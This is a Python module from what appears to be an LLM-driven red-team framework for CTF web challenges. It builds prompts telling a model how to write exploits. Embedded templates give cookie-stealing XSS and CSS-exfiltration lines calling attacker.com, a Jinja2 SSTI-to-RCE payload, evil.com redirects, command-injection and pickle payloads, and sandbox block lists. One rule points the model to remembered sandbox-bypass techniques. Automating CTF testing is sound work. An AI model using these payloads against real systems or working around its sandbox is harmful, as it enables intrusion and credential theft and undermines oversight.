from __future__ import annotations

import ast
import json
import os
import platform
import re
from pathlib import Path
from typing import Any

from core.challenge_adapter import ChallengeAdapter, get_adapter
from core.llm_client import DeepSeekClient
from core.memory_store import LayeredMemory
from core.settings import Settings
from core.template_manager import TemplateManager
from memory.exploit_trajectory import ExploitTrajectoryMemory, get_trajectory
from memory.verification_memory import VerificationMemory, get_verification
from memory.exploit_primitives import get_primitive_registry
from memory.primitive_learning import get_learning_engine
from memory.primitive_transition_graph import get_transition_graph
from control.anti_regression import PayloadEvolutionEngine, AntiRegressionController


# ═══════════════════════════════════════════════════════════════════
# Memory Budget Controller (Task 4 — Strict Memory Budgeting)
# 对长期记忆实施强制分层配额，防止单次长报错冲垮全局约束。
# 每层独立物理舱壁；超配额内容由 head/tail 正则裁剪。
# ═══════════════════════════════════════════════════════════════════

# ── Task 3: Strict Memory Budgeting — physical hard cap per layer ──
# 每一层在物理字符级别被硬截断，不再只是 "打印预算"；总 payload 死锁在 ~4000 chars。
MEMORY_BUDGET: dict[str, int] = {
    "runtime_constraints": 800,    # L1 Manifest — 必须保持紧凑
    "hard_constraints": 600,       # L2 Hard Constraints & Bans
    "sdk_contract": 500,           # L3 SDK API Contract
    "verified_facts": 800,         # L4 Verified Facts + Memory context
    "trajectory_state": 300,       # L5 Dehydrated trajectory (compact JSON)
    "user_goal": 2500,             # L6 User Goal — 裁剪后的攻击目标摘要
}

# 最终 payload 的物理硬上限（所有层拼接后强制执行一次，双保险）
_FINAL_PAYLOAD_HARD_CAP = 5000


def _physical_truncate(content: str, limit: int) -> str:
    """Hard character-level truncation — no head/tail, straight slice.

    Keeps the beginning of the content up to *limit* characters,
    appending a compact truncation marker.
    """
    if len(content) <= limit:
        return content
    # Keep first (limit - 50) chars to make room for the marker
    keep = limit - 50
    if keep <= 0:
        keep = limit // 2
    return content[:keep] + f"\n...[TRUNCATED {len(content)}→{limit} chars]..."


def _apply_memory_budget(section_id: str, content: str) -> str:
    """Physically enforce the per-layer character budget defined by MEMORY_BUDGET.

    Uses hard slicing (not head/tail) to guarantee deterministic character limits.
    If *section_id* is not registered, passes through unchanged (caller must handle).
    """
    limit = MEMORY_BUDGET.get(section_id)
    if limit is None:
        return content
    return _physical_truncate(content, limit)


# ═══════════════════════════════════════════════════════════════════
# Task 5 — Attention-Prioritized Prompt Assembly (6 layers)
# ═══════════════════════════════════════════════════════════════════

def _build_runtime_manifest_block() -> str:
    """[Layer 1] Runtime Manifest — 显式能力清单（硬编码，零幻觉）。"""
    try:
        from coordinator import RUNTIME_MANIFEST  # noqa: F811
        mf = RUNTIME_MANIFEST
    except ImportError:
        # Fallback 必须与 coordinator.RUNTIME_MANIFEST 保持 1:1 物理一致
        mf = {
            "sdk_primitives": [
                "HttpClient.get",
                "HttpClient.post",
                "HttpClient.raw_request",
                "HttpClient.last_response",
            ],
            "safe_modules": [
                "json", "base64", "re", "time", "struct",
                "urllib.parse", "http.cookies",
                "hashlib", "hmac",
                "redteam_sdk",
            ],
            "blocked_modules": [
                "os", "subprocess", "socket", "ctypes", "cffi", "pty",
                "signal", "multiprocessing", "importlib", "pickle", "marshal",
                "builtins", "gc", "inspect", "ast", "code", "codeop",
                "compileall", "dis", "types", "weakref",
                "requests", "urllib3", "urllib",
            ],
            "network_mode": "bridge",
            "target_access_mode": "container_ip_only",
        }
    prims = ", ".join(mf.get("sdk_primitives", []))
    safe = ", ".join(sorted(mf.get("safe_modules", [])))
    blocked = ", ".join(sorted(mf.get("blocked_modules", [])))
    return (
        "RUNTIME MANIFEST (能力注册清单)\n"
        f"  SDK Primitives: {prims}\n"
        f"  Allowed modules: {safe}\n"
        f"  Blocked modules: {blocked}\n"
        f"  Network: {mf.get('network_mode', 'bridge')} | "
        f"Target: {mf.get('target_access_mode', 'container_ip_only')}"
    )


def _build_hard_constraints_block() -> str:
    """[Layer 2] Hard Constraints — 绝对禁令（不可违反的物理约束）。"""
    return (
        "HARD CONSTRAINTS (绝对禁令)\n"
        "  ❌ import os, subprocess, socket, pickle, ctypes, requests, urllib3\n"
        "  ❌ os.system() / subprocess.run() / __import__() — 文本也被拦截\n"
        "  ❌ shell 禁止 bash/sh/zsh；❌ curl|sh, wget|sh\n"
        "  ❌ 单行分号串联 (SyntaxError)\n"
        "  ✅ import: json, re, base64, hashlib, hmac, struct, urllib.parse, http.cookies\n"
        "  ✅ HTTP 唯一通道: redteam_sdk.HttpClient\n"
        "  ✅ OOB 唯一通道: redteam_sdk.OOBReceiver"
    )


def _build_sdk_contract_block() -> str:
    """[Layer 3] SDK API Contract — 唯一合法接口契约。"""
    return (
        "SDK API CONTRACT (唯一合法接口)\n"
        "  from redteam_sdk import HttpClient, ContextStore, OOBReceiver\n"
        "  s = HttpClient(target_base)    # 自动 session 持久化\n"
        "  s.get(path) / s.post(path, data=...) / s.put(path, json=...)\n"
        "  s.raw_request('GET', '/path#frag')  # WAF绕过保留特殊字符\n"
        "  oob = OOBReceiver(port=8765); oob.start()\n"
        "  hit = oob.wait_for_callback(timeout=30)\n"
        "  target_base=json.load(open('/workspace/context.json')).get('target_context',{}).get('base_url','')"
    )


# ═══════════════════════════════════════════════════════════════════
# Task 6 — Structured JSON AST extraction
# ═══════════════════════════════════════════════════════════════════

_SDK_CALL_PATTERNS = [
    r"\b(HttpClient\s*\.\s*\w+\s*\()",
    r"\b(OOBReceiver\s*\.\s*\w+\s*\()",
    r"\b(ContextStore\s*\.\s*\w+\s*\()",
    r"\b(save_context\s*\()",
    r"\b(load_context\s*\()",
    r"\b(output_result\s*\()",
]


def _extract_step_ast(step: dict[str, Any]) -> dict[str, Any]:
    """Parse a step's command code and extract structured imports + SDK calls.

    In AST mode (sdk_calls present, no command): uses declared imports/sdk_calls directly.
    In LEGACY mode (command present): ast.parse() + regex extraction.

    Returns the step dict enriched with:
      - _ast_imports: list[str]    — modules imported in this step
      - _ast_sdk_calls: list[str]  — SDK primitives invoked
      - _ast_valid: bool           — True if AST parsing succeeded
    """
    declared_sdk = step.get("sdk_calls")
    is_ast_mode = isinstance(declared_sdk, list) and len(declared_sdk) > 0

    if is_ast_mode:
        # Pure AST mode — use declared arrays directly, no ast.parse() needed
        step["_ast_imports"] = step.get("imports") or []
        step["_ast_sdk_calls"] = declared_sdk
        step["_ast_valid"] = True
        return step

    cmd = step.get("command", "")
    if not isinstance(cmd, str) or not cmd.strip():
        step["_ast_imports"] = []
        step["_ast_sdk_calls"] = []
        step["_ast_valid"] = False
        return step

    imports: list[str] = []
    sdk_calls: list[str] = []

    try:
        tree = ast.parse(cmd)
        step["_ast_valid"] = True
    except SyntaxError:
        step["_ast_imports"] = []
        step["_ast_sdk_calls"] = []
        step["_ast_valid"] = False
        return step

    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                imports.append(alias.name)
        elif isinstance(node, ast.ImportFrom):
            module = node.module or ""
            for alias in node.names:
                imports.append(f"{module}.{alias.name}" if module else alias.name)

    # Regex-based SDK call extraction (more robust than AST walking for
    # chained calls like s.get(...) where s is a local variable).
    for pattern in _SDK_CALL_PATTERNS:
        for m in re.finditer(pattern, cmd):
            call = m.group(1)
            if call not in sdk_calls:
                sdk_calls.append(call)

    step["_ast_imports"] = imports
    step["_ast_sdk_calls"] = sdk_calls
    return step


def _extract_plan_ast(plan: dict[str, Any]) -> dict[str, Any]:
    """Post-process a plan: extract AST metadata from every step."""
    steps = plan.get("steps")
    if not isinstance(steps, list):
        return plan
    for st in steps:
        if isinstance(st, dict) and st.get("type") == "python":
            _extract_step_ast(st)
    return plan


def _get_os_context() -> str:
    system = platform.system().lower()
    if system == "windows":
        return """
【重要 - Windows 环境注意事项】
当前运行环境是 Windows 系统！
"""
    else:
        return """
【Linux/macOS 环境】
"""


def _extract_target_tags(confirmed: dict[str, Any]) -> list[str]:
    """从 confirmed_vuln.json 提取当前靶机的技术栈标签用于 ChromaDB 元数据过滤。

    标签来源（按优先级）：
    1. CWE ID 列表
    2. evidence / description 中的关键字词（库名、框架、协议、CVE 编号）
    3. 静态关键词表（基于常见漏洞类型 + 框架名精确匹配）
    4. title / vulnerability 字段

    返回值经过去重、小写、去噪，最多返回 15 个标签。
    """
    vulns = confirmed.get("vulnerabilities", [])
    target_ctx = confirmed.get("target_context", {})
    tags: list[str] = []

    # ── 1. CWE IDs ──
    for v in vulns:
        for key in ("cwe_id", "cwe"):
            cwe = v.get(key, "")
            if isinstance(cwe, str) and cwe.strip() and cwe.strip().upper() != "UNKNOWN":
                tags.append(cwe.strip().lower())

    # ── 2. 拼接所有文本字段做关键词提取 ──
    text_blob_parts: list[str] = []
    for v in vulns:
        for key in ("title", "description", "evidence", "attack_chain", "data_flow",
                     "source", "sink", "location"):
            val = v.get(key, "")
            if isinstance(val, str):
                text_blob_parts.append(val)
            elif isinstance(val, dict):
                text_blob_parts.append(val.get("code_snippet", ""))
    text_blob = " ".join(text_blob_parts)

    # CVE 编号（CVE-YYYY-NNNNN）
    for match in re.finditer(r'CVE-\d{4}-\d{4,}', text_blob, re.IGNORECASE):
        tags.append(match.group(0).lower())

    # 提取关键词：框架 / 库 / 协议 / 技术栈名称
    # 知名安全相关技术栈关键词
    known_keywords = [
        # Web frameworks
        "flask", "django", "fastapi", "express", "spring", "laravel", "rails",
        "asp.net", "aspnet", "node.js", "nodejs", "react", "vue", "angular",
        # Auth / JWT
        "jwt", "oauth", "oauth2", "saml", "openid", "jose", "jwk", "jws", "jwe",
        "python_jwt", "pyjwt", "authlib", "jwcrypto",
        # Proxy / LB
        "haproxy", "nginx", "apache", "traefik", "envoy", "caddy", "iis",
        # Protocols
        "http", "https", "websocket", "grpc", "graphql", "rest", "soap",
        # Serialization
        "pickle", "json", "yaml", "xml", "protobuf", "avro",
        # Databases
        "mysql", "postgresql", "postgres", "sqlite", "mongodb", "redis",
        "mssql", "oracle", "mariadb",
        # Languages
        "python", "java", "php", "ruby", "go", "golang", "javascript", "typescript",
        "c#", "csharp", "perl", "lua",
        # Template engines
        "jinja2", "jinja", "twig", "freemarker", "velocity", "thymeleaf", "mustache",
        "handlebars", "ejs", "pug", "nunjucks", "smarty",
        # Attack types (from CWE)
        "ssti", "sqli", "sql", "xss", "csrf", "ssrf", "rce", "lfi", "rfi",
        "path_traversal", "command_injection", "deserialization", "xxe",
        "idor", "auth_bypass", "algorithm_confusion",
        # Misc security terms
        "rsa", "rs256", "hs256", "ps256", "es256", "ed25519", "ecdsa",
        "sha256", "md5", "aes", "hmac",
        # Tool-specific
        "nuclei", "sqlmap", "burp", "metasploit",
        # Docker / infra
        "docker", "kubernetes", "k8s", "aws", "gcp", "azure",
    ]
    text_lower = text_blob.lower()
    for kw in known_keywords:
        if kw in text_lower:
            tags.append(kw)

    # ── 3. 从 target_context 提取 ──
    app_name = target_ctx.get("app_name", "")
    if isinstance(app_name, str) and app_name.strip():
        for word in app_name.lower().replace("_", " ").replace("-", " ").split():
            w = word.strip()
            if w and len(w) >= 2:
                tags.append(w)

    base_url = target_ctx.get("base_url", "")
    if isinstance(base_url, str):
        if "https" in base_url:
            tags.append("https")

    # ── 4. Evidence 中特定代码模式 ──
    evidence_specific: list[str] = []
    for v in vulns:
        evidence = v.get("evidence", "")
        if isinstance(evidence, dict):
            evidence = evidence.get("code_snippet", "")
        if isinstance(evidence, str):
            evidence_specific.append(evidence)
    evidence_text = " ".join(evidence_specific)
    # 从代码片段中提取 import / require / use 语句中的库名
    for match in re.finditer(r'(?:import|from|require|use)\s+(\w+)', evidence_text):
        lib = match.group(1).lower()
        if lib not in ("os", "sys", "re", "json", "time", "io", "typing"):
            tags.append(lib)

    # ── 5. 去重 + 去噪 ──
    noise = {"", "unknown", "none", "a", "in", "of", "to", "is", "it", "be", "as", "at",
             "by", "an", "or", "on", "no", "so", "do", "if", "we", "he", "me", "my", "up",
             "the", "and", "for", "with", "that", "this", "from", "when", "file", "line",
             "rce", "lfi"}
    seen: set[str] = set()
    deduped: list[str] = []
    for t in tags:
        t = t.strip().lower()
        if t and t not in seen and t not in noise:
            seen.add(t)
            deduped.append(t)

    # Cap at 15 to keep the $or clause reasonable
    return deduped[:15]


_COMMON_RULES = """════════════════════ 沙箱执行约束 ════════════════════

【🔴 核心行动钢印：运行时反射探测（Reflection）】
当你需要使用本地的自定义模块（如 `redteam_sdk`、`OOBReceiver`）或者调用未知组件，且你在当前长期记忆中找不到其确切的方法名定义时，**你绝对禁止在第一轮迭代中直接编造复杂的利用代码**。
你必须遵守黑客探针前置原则：在 Step 1 编写一个极简的反射探针，利用 `import redteam_sdk; print("[REFLECT_SDK]", dir(redteam_sdk), dir(redteam_sdk.OOBReceiver))` 并在 stdout 中打印。
本框架的沙箱执行器会将沙箱的 stdout 完美喂回给你。在接下来的迭代轮次中，你必须实时审查 feedback 中捕获到的真实成员属性列表，据此编写 100% 精确的利用代码，彻底消除接口幻觉。

【❌ 绝对禁令 — SDK 内部键名与属性焊死约束（违反立即导致 NameError / KeyError）】
  读取上下文 context.json 时，必须使用 `.get('target_context', {})`。严禁盲猜或使用 'locked_host' 键！
  调用 OOB 接收器时，获取回调 URL 的唯一合法属性是 `OOBReceiver.url`，严禁调用不存在的 `get_address()` 方法！
  ContextStore 只有 .save(key, val) 和 .load(key) 两个方法，严禁调用 .get() / .set() / .fetch() 等不存在的方法！

【⛔ 禁止导入的模块 + 禁止的代码模式（导入/执行必被拦截，不要浪费时间！）】
  ❌ import os, subprocess, socket, pickle, ctypes, cffi, importlib, builtins
  ❌ gc, inspect, ast, code, codeop, dis, types, marshal, pty, multiprocessing, signal, weakref
  ❌ __import__('os') / compile() / execfile() — 运行时也会被正则拦截，别试绕过！
  ❌ os.system() / os.popen() / subprocess.run() — 任何形式的命令执行都会被拦截
  ❌ shell 步骤禁止 bash/sh/zsh — 只允许 curl, wget, python3 等白名单工具
  ❌ import requests, urllib3, urllib, httpx, http — 原生通信库全部被禁！唯一合法网络通道: redteam_sdk.HttpClient

【✅ 允许的 Python 模块 — 所有 import 只能从这里面选！】
  json, re, base64, hashlib, hmac, struct, binascii
  bs4(BeautifulSoup), jwt, html, xml, lxml
  Crypto, cryptography
  time, datetime, random, string, itertools, functools, collections, copy, io, pathlib
  threading, redteam_sdk
  typing, dataclasses, enum, abc, codecs, unicodedata, math, decimal, fractions

【✅ shell 白名单工具】curl, wget, python3, py, jq, grep, awk, sed, cut, sort, uniq, tr, head, tail, echo, cat, ls, pwd, dig, nslookup, host, openssl, nmap, sqlmap, nikto, wfuzz, ffuf, gobuster

1. /workspace 只读！数据传递用 save_context/load_context 或写 /tmp/
   ⚠️ step 之间禁止通过 /tmp 文件传递数据，必须在单个 step 的 code 里完成完整的请求链，
   先 GET 获取数据，立即在同一脚本里 POST 使用它，不要拆成两个依赖文件的 step。
2. HTTP 交互用 HttpClient (requests.Session 封装)，反连监听用 OOBReceiver
3. Python 代码必须多行缩进，严禁单行分号串联 (SyntaxError)
4. 禁止 pipe 到 sh/bash，禁止编造 URL 路径，禁止手写正则解析 HTML/JSON/JWT
5. ⚠️ Validator 只检查 import 语句，Executor 会额外对代码文本做正则拦截（os.system/subprocess 字面量也会被拦）
6. 遇到沙箱拦截 → 查看下方"🛡️ 沙箱冲突规避"记忆区获取正确绕过手法（不从这里找答案）

═══════════════ SDK 速查表 (redteam_sdk) ═══════════════
🔴 唯一合法网络通道！所有 HTTP 操作必须且只能通过 SDK 原语执行。
from redteam_sdk import HttpClient, ContextStore, OOBReceiver, save_context, load_context, output_result

# base_url 从 context.json 动态读取，禁止硬编码域名
import json
with open('/workspace/context.json') as f: ctx = json.load(f)
target_base = ctx.get('target_context', {}).get('base_url', '')
s = HttpClient(target_base)          # 自动恢复/保存 Session Cookie

s.get(path) / s.post(path, data=...) / s.put(path, json=...) / s.delete(path)
s.raw_request('GET', '/path#frag')    # WAF绕过：保留 # %00 ..;/ 等字符
s.auto_extract_csrf()                 # 从 JWT cookie 或 HTML 自动提取 antiCSRFToken

ctx = ContextStore(); ctx.save('k', v); ctx.load('k')   # 跨步骤 KV 存储
save_context('k', v); load_context('k'); output_result(dict)  # 快捷方式

oob = OOBReceiver(port=8765); oob.start()  # Blind RCE 带外反连
hit = oob.wait_for_callback(timeout=30)    # 等待目标回连
oob.stop()

# 数据解析：HTML→BeautifulSoup, JSON→r.json(), JWT→base64+json, 禁止手写正则
# REST 调试：Form=用data=, JSON=用json=; 401→先确认登录成功; 405→换Method
# Shell 步骤: curl|jq ✅  curl|sh ❌; sqlmap -u "URL" --batch --level=2
"""


def _discover_blueprint_prefixes(confirmed: dict[str, Any]) -> dict[str, str]:
    vulns = confirmed.get("vulnerabilities", [])
    if not vulns:
        return {}

    prefixes: dict[str, str] = {}

    bp_pattern = re.compile(r"""register_blueprint\((\w+)\s*,\s*url_prefix\s*=\s*['\"](/[^'\"]*)['\"]""")
    route_raw_pattern = re.compile(r"""@(\w+)\.route\(['\"](/[^'\"]*)['\"]""")

    for vuln in vulns:
        evidence = vuln.get("evidence", "")
        if isinstance(evidence, dict):
            code = evidence.get("code_snippet", "")
        else:
            code = str(evidence)

        for match in bp_pattern.finditer(code):
            bp_name = match.group(1)
            prefix = match.group(2)
            if bp_name not in prefixes:
                prefixes[bp_name] = prefix

        description = vuln.get("description", "") + vuln.get("attack_chain", "")
        for match in bp_pattern.finditer(description):
            bp_name = match.group(1)
            prefix = match.group(2)
            if bp_name not in prefixes:
                prefixes[bp_name] = prefix

    if not prefixes:
        for vuln in vulns:
            evidence = vuln.get("evidence", "")
            if isinstance(evidence, dict):
                code = evidence.get("code_snippet", "")
            else:
                code = str(evidence)
            description = vuln.get("description", "") + vuln.get("attack_chain", "")
            all_text = f"{code} {description}"

            for match in route_raw_pattern.finditer(all_text):
                bp_name = match.group(1)
                if bp_name in ("web", "api"):
                    if bp_name not in prefixes:
                        if bp_name == "web":
                            prefixes[bp_name] = "/challenge"
                        elif bp_name == "api":
                            prefixes[bp_name] = "/challenge/api"

    return prefixes


def _extract_endpoints_from_vulns(vulns: list[dict[str, Any]], prefixes: dict[str, str]) -> list[str]:
    seen = set()
    endpoints: list[str] = []

    route_re = re.compile(r"""@(\w+)\.route\(['\"](/[\w/<>-]*)['\"]""")
    url_re = re.compile(r"""(?:POST|GET|PUT|DELETE|PATCH)\s+(/\S+)""")
    path_re = re.compile(r"""/[\w.-]*(?:api|challenge|login|register|profile|upload|download|report|add(?:Item|Contract|Product)|sendVerification|product|admin|contract|verify|settings|home|external|logout|static|user|auth|file|image|comment|post|search|query|admin|api|rest|graphql|ws|socket)[\w/<>?&=._-]*""")

    for vuln in vulns:
        evidence = vuln.get("evidence", "")
        if isinstance(evidence, dict):
            code = evidence.get("code_snippet", "")
            file_path = evidence.get("file", "")
        else:
            code = str(evidence)
            file_path = ""

        attack_chain = vuln.get("attack_chain", "")
        data_flow = vuln.get("data_flow", "")
        description = vuln.get("description", "")

        all_text = f"{code} {attack_chain} {data_flow} {description} {file_path}"

        for match in route_re.findall(all_text):
            bp_name, ep = match
            ep = ep.strip()
            prefix = prefixes.get(bp_name, "")
            full = prefix + ep if prefix else ep
            if full not in seen:
                seen.add(full)
                endpoints.append(full)

        for match in url_re.findall(all_text):
            ep = match.strip()
            if ep not in seen:
                seen.add(ep)
                endpoints.append(ep)

        for match in path_re.findall(all_text):
            ep = match.strip()
            if "?" in ep:
                ep = ep.split("?")[0]
            ep = ep.rstrip("/. ")
            if not ep or ep in seen:
                continue
            if re.search(r"\.(py|html|js|css|c|h|txt|md)$", ep):
                continue
            if re.search(r"/(application|blueprints|templates|static|config|middleware|database|util|bot|email|release|node_modules|vendor)/", ep):
                continue
            if re.search(r"(cybench_web_challenges|target_codebase)", ep):
                continue
            if ep in ("/contracts", "/challenge", "/"):
                continue
            seen.add(ep)
            endpoints.append(ep)

    for ep in list(endpoints):
        if prefixes and not any(ep.startswith(p) for p in prefixes.values()):
            default_prefix = next(iter(prefixes.values()))
            resolved = default_prefix + ep
            if resolved not in seen:
                seen.add(resolved)
                endpoints.append(resolved)

    return [ep for ep in endpoints if ep.startswith("/")]


def _build_vuln_table(vulns: list[dict[str, Any]]) -> str:
    lines = []
    for v in vulns:
        vid = v.get("id", "?")
        title = v.get("title", "?")
        cwe = v.get("cwe_id", "?")
        severity = v.get("severity", "?")
        source = v.get("source", "")
        sink = v.get("sink", "")
        lines.append(
            f"  [{severity}] {vid} | {cwe} | {title}\n"
            f"    攻击面: {source} -> {sink}"
        )
    return "\n".join(lines)


def _build_evidence_extracts(vulns: list[dict[str, Any]]) -> str:
    parts = []
    for v in vulns:
        vid = v.get("id", "?")
        title = v.get("title", "?")

        evidence = v.get("evidence", "")
        if isinstance(evidence, dict):
            file = evidence.get("file", "")
            lines_info = evidence.get("lines", "")
            code = evidence.get("code_snippet", "")
        else:
            file = ""
            lines_info = ""
            code = str(evidence)

        attack_chain = v.get("attack_chain", "")
        data_flow = v.get("data_flow", "")
        source = v.get("source", "")
        sink = v.get("sink", "")
        description = v.get("description", "")

        block_parts = [f"## {vid}: {title}"]
        if file:
            block_parts.append(f"文件: {file} (行 {lines_info})")
        block_parts.append(f"攻击面: source={source}, sink={sink}")
        if attack_chain:
            block_parts.append(f"攻击链: {attack_chain}")
        if data_flow:
            block_parts.append(f"数据流: {data_flow}")
        if description:
            block_parts.append(f"描述: {description}")
        if code:
            block_parts.append(f"漏洞代码:\n```\n{code}\n```")

        parts.append("\n".join(block_parts))

    return "\n\n".join(parts)


def _build_cwe_templates_generic(cwe_set: set[str]) -> str:
    templates = []

    if "CWE-94" in cwe_set or "CWE-917" in cwe_set:
        templates.append("""
【SSTI/模板注入攻击模板（CWE-94/CWE-917）— 通用版】：
常见触发点：邮件渲染、页面模板、PDF生成、日志记录
常见框架：Jinja2 (Flask/Django), Twig (PHP), ERB (Ruby), Freemarker (Java)

基础探测payload（验证SSTI是否存在）：
{{7*7}}  → 期望输出 49
${7*7}   → 期望输出 49（Freemarker）
#{7*7}   → 期望输出 49（Thymeleaf）

Jinja2 SSTI→RCE payload示例（根据实际注入点调整参数名）：
import requests,urllib3,json; urllib3.disable_warnings(); base='{TARGET_BASE_URL}'
payload="{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
r=requests.post(f'{base}{INJECTION_ENDPOINT}', data={'EMAIL_FIELD':payload+'@x.com','OTHER_FIELDS':'values'}, verify={VERIFY_FLAG})
print('###CHAIN_OUTPUT###'+json.dumps({'status':r.status_code,'body':r.text[:300]}))

注意：
- SSTI执行结果通常不会直接返回给攻击者！需要配合其他漏洞（如XSS、文件写入、外带DNS）获取结果
- 根据证据中的 attack_chain 确认具体的注入点和触发路径
- 如果目标有邮件发送功能，SSTI可能在邮件渲染时触发
""")

    if "CWE-79" in cwe_set:
        templates.append("""
【XSS/CSS注入攻击模板（CWE-79）— 通用版】：
分类与利用场景：

1. 存储型XSS（持久化）：
   - 用户资料、评论、商品描述等存储后由其他用户/管理员查看的字段
   - Payload: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
   - 或 <img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">

2. CSS注入（属性选择器数据外带）：
   - 当页面包含敏感值在HTML元素中时（如<input value="SECRET">）
   - 利用CSS属性选择器逐字符泄露：
     input[value^="a"] { background:url(https://attacker.com/char?a) }
     input[value^="ab"] { background:url(https://attacker.com/prefix?ab) }
   - 匹配成功时浏览器自动发起请求，逐字符泄露token/secret

3. DOM-based XSS：
   - 危险函数：innerHTML, document.write(), eval(), setTimeout(), location.hash
   - 寻找未过滤的用户输入直接插入DOM的位置

4. Service Worker注入：
   - 如果应用注册了SW且SW源可控制，可劫持所有网络请求
   - 注入恶意SW后可拦截/修改请求、窃取cookie

通用利用流程：
Step 1 - 注入payload到可存储字段
Step 2 - 触发管理员/Bot访问含payload的页面（report功能、分享链接等）
Step 3 - 在attacker服务器接收窃取的数据（cookie/token/session）
Step 4 - 用窃取的凭证进行权限提升操作
""")

    if "CWE-352" in cwe_set:
        templates.append("""
【CSRF保护绕过策略（CWE-352）— 通用版】：
常见CSRF保护机制及绕过方法：

1. Token验证（Referer/Origin检查）：
   - 绕过：如果token可通过XSS/CSS注入获取，则可构造完整CSRF请求
   - 绕过：如果token验证不严格（接受空值、任意值）

2. SameSite Cookie：
   - Strict: 完全阻止跨站（最难绕过）
   - Lax: GET请求可跨站（可结合开放重定向）
   - None: 无保护（需Secure标志+HTTPS）

3. JWT中的CSRF token：
   - 如果JWT存储在非HttpOnly cookie中，JS可读取
   - 通过XSS/CSS提取JWT内的CSRF token
   - 用提取的token构造合法请求

通用绕过思路：
A - 先通过其他漏洞（XSS/CSS注入）获取CSRF token
B - 分析token生成逻辑，尝试预测/伪造
C - 寻找无需token的API端点（遗漏）
D - 如果是双token机制（cookie+header），尝试只满足其中一个
""")

    if "CWE-362" in cwe_set:
        templates.append("""
【竞态条件利用策略（CWE-362）— 通用版】：
典型场景：
- 文件上传：TOCTOU（Time of Check to Time of Use）竞争
- 权限变更：先检查后更新的非原子操作
- 资源分配：并发请求抢夺同一资源
- 状态转换：支付/审批等多状态系统的状态竞争

通用利用框架（Python threading）：
import requests,urllib3,json,threading,time; urllib3.disable_warnings(); base='{TARGET_BASE_URL}'
s=requests.Session(); s.verify={VERIFY_FLAG}
results=[]; errors=[]
def race_request(payload_data, label):
    try: r=s.post(f'{base}{RACE_ENDPOINT}', data=payload_data, cookies=s.cookies); results.append((label,r.status_code,r.text[:200]))
    except Exception as e: errors.append(str(e))
threads=[threading.Thread(target=race_request, args=(data1,'req1')), thread.Thread(target=race_request, args=(data2,'req2'))]
[t.start() for t in threads]; [t.join() for t in threads]
print('###CHAIN_OUTPUT###'+json.dumps({'results':results,'errors':errors}))

关键要点：
- 并发线程数通常10-50个，取决于TOCTOU窗口大小
- 两个请求的参数必须有冲突（一个合法一个越权）
- 需要多次循环尝试（竞态窗口可能只有毫秒级）
- 成功标志：返回结果中出现越权操作的痕迹
""")

    if "CWE-434" in cwe_set:
        templates.append("""
【文件上传漏洞利用（CWE-434）— 通用版】：
常见攻击向量：

1. 路径遍历（../../../）：
   - filename参数注入 ../ 写入任意位置
   - 目标：webshell (.php/.jsp/.asp)、配置文件覆盖、cron job

2. 文件类型伪造：
   - Magic bytes伪造：%PDF- (PDF), GIF89a (GIF), PK\\x03\\x04 (ZIP)
   - 双扩展名：shell.php.jpg (配合Apache解析漏洞)
   - Null字节截断：shell.php%00.jpg (旧版本)

3. 元数据/头信息注入：
   - ExifTool处理的JPEG/PDF可注入命令
   - SVG文件内嵌JavaScript
   - Office宏（.docm/.xlsm）

4. 存储型XSS via文件名：
   - 文件名反射到HTML时未转义

通用测试流程：
Step 1 - 上传正常文件确认功能可用
Step 2 - 尝试magic bytes伪造（%PDF-开头+恶意内容）
Step 3 - 尝试路径遍历（filename=../../evil.php）
Step 4 - 尝试元数据注入（如果有ExifTool/ImageMagick处理）
Step 5 - 如果有解析/预览功能，尝试对应格式的RCE
""")

    if "CWE-601" in cwe_set:
        templates.append("""
【开放重定向利用（CWE-601）— 通用版】：
测试方法：修改url/redirect/next/target/callback参数为外部域名
import requests,urllib3; urllib3.disable_warnings(); base='{TARGET_BASE_URL}'
r=requests.get(f'{base}{REDIRECT_ENDPOINT}?url=https://evil.com', allow_redirects=False, verify={VERIFY_FLAG})
print('###CHAIN_OUTPUT###'+str({'status':r.status_code,'location':r.headers.get('Location')}))
利用场景：钓鱼攻击、窃取OAuth token、绕过referer检查
""")

    if "CWE-89" in cwe_set:
        templates.append("""
【SQL注入攻击模板（CWE-89）— 通用版】：
快速验证：' OR '1'='1' -- / " OR "1"="1
自动化工具：sqlmap -u "URL" --batch --level=2 --risk=2 [--force-ssl]
手动注入流程：
1. 确定注入点（参数/Headers/Cookie）
2. 判断数据库类型（报错差异/注释符/内置函数）
3. 确定字段数（ORDER BY 1,2,3...）
4. 获取数据库名/表名/列名
5. 提取敏感数据（credentials/flags）
""")

    if "CWE-78" in cwe_set:
        templates.append("""
【命令注入策略（CWE-78）— 通用版】：
分隔符：; & && | || $() ` \\n %0a %0d
测试payload：;whoami / $(whoami) / `whoami` / | whoami
盲注技巧：sleep 5 / ping -c 5 attacker.com（时间侧信道）
""")

    if "CWE-502" in cwe_set:
        templates.append("""
【反序列化攻击模板（CWE-502）— 通用版】：
Pickle (Python)：pickle.dumps((os.system,('cmd',)))
Java: ysoserial生成gadget链
PHP: unserialize() + POP chain
注意：反序列化通常需要知道目标使用的库版本以构造正确的gadget链
""")

    if "CWE-918" in cwe_set:
        templates.append("""
【SSRF攻击策略（CWE-918）— 通用版】：
⚠️ 以下为 SSRF 注入载荷（注入到目标请求参数中，由目标服务器代发），不是你自己脚本的连接目标！
内网探测：127.0.0.1:6379(Redis), localhost:3306(MySQL), localhost:8080
云元数据：169.254.169.254(AWS/GCP/Azure)
绕过WAF：十进制IP(2130706433=127.0.0.1)、短URL重定向、DNS rebinding
🔴 你自己的脚本始终使用 target_base 动态变量连接目标，禁止硬编码 localhost/127.0.0.1！
""")

    if templates:
        return "\n".join([
            "【CWE专项攻击模板 — 通用版】（以下模板适用于各类CTF/Web安全题目，请根据实际目标调整{TARGET_BASE_URL}和{INJECTION_ENDPOINT}等占位符）：",
            *templates,
        ])
    return ""


def _build_cwe_templates(vulns: list[dict[str, Any]], confirmed: dict[str, Any]) -> str:
    mgr = TemplateManager()
    external_templates = mgr.get_templates_for_target(confirmed)
    if external_templates:
        return external_templates
    cwe_set = {v.get("cwe_id", "") for v in vulns}
    return _build_cwe_templates_generic(cwe_set)


# ═══════════════════════════════════════════════════════════════════
# Task 2 — 硬核目标摘要提取器 (User Goal Truncation)
# 原始文本超过 _USER_GOAL_SOFT_LIMIT 时执行硬性正则提取，
